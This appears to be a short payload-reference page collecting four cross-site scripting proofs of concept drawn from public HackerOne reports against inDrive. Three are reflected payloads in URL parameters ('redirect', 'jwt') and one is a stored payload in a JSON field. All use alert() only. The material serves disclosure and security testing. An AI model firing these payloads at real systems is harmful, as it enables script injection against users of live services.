# inDrive

4 payloads.

### `27ffac35`

```
https://target.com/webview/v1/refresh-jwt?redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(1
```

**Parameter:** `redirect`
— [#1 XSS on target.com](https://hackerone.com/reports/2014955) · inDrive · [maxdha](https://hackerone.com/maxdha)

### `47b8e544`

```
https://target.com/webview/v1?phone=████████&token=██████████&service=cargo&locale=en&jwt=%22%3E%3Cimg%20src=raw%20onerror=alert(%22hackerone%22
```

**Parameter:** `jwt`
— [#2 XSS on target.com](https://hackerone.com/reports/2015074) · inDrive · [maxdha](https://hackerone.com/maxdha)

### `8d09bf75`

```
https://target.com/webview/v1/transport-change?phone=██████&token=█████████&service=intercity3&jwt=fw%22%3E%3Cimg%20src=fwa%20onerror=alert(1
```

**Parameter:** `jwt`
— [#3 XSS on target.com](https://hackerone.com/reports/2028265) · inDrive · [maxdha](https://hackerone.com/maxdha)

### `31c4f9d3`

```
{"id":"4","activationDate":"<script>alert(1)</script>"}
```

**Parameter:** `activationDate`
— [Stored XSS on target.com](https://hackerone.com/reports/2051085) · inDrive · [kristoferent](https://hackerone.com/kristoferent) · $284.0
